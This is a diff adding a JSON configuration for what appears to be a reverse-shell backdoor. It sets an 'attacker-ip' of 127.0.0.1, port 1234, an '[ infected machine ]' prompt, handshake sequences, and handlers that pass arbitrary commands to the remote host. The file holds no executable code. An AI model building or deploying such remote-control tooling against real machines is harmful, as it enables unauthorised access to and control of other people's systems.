@@ -1,0 +1,57 @@
+{
+	"buffer-size": 32,
+	"attacker-ip": "127.0.0.1",
+	"fallback-ip": null,
+	"acceptable-ports": [
+		1234
+	],
+	"message-suffix": "\u0003",
+	"prompt": {
+		"use-shell-prompt": false,
+		"fallback-prompt": "[ infected machine ]-> "
+	},
+	"handshake-sub-protocol": {
+		"server": {
+			"unconditional-sequence": [
+				"\u0002",
+				"$(if ${use-shell-prompt} then send '\u0002' otherwise end comms)"
+			]
+		},
+		"client": {
+			"unconditional-sequence": [
+				"\u0002",
+				"$(if ${use-shell-prompt} then send ${shell-prompt} otherwise send ${fallback-prompt})"
+			]
+		}
+	},
+	"fallback-communications-sub-protocol": {
+		"server": {
+			"unconditional-sequence": [
+				"\u0002",
+				"$(call handle-fallback-communication)"
+			]
+		},
+		"client": {
+			"unconditional-sequence": [
+				"\u0002",
+				"$(call handle-fallback-communication)"
+			]
+		}
+	},
+	"normal-sub-protocol": {
+		"function-configurations": [
+			{
+				"function-to-call-on-match": "handle_exit",
+				"data-must-equal": "exit"
+			},
+			{
+				"function-to-call-on-match": "handle-change-dir",
+				"data-must-be-prefixed": "cd"
+			},
+			{
+				"function-to-call-on-match": "handle-command",
+				"data-can-be-anything": true
+			}
+		]
+	}
+}
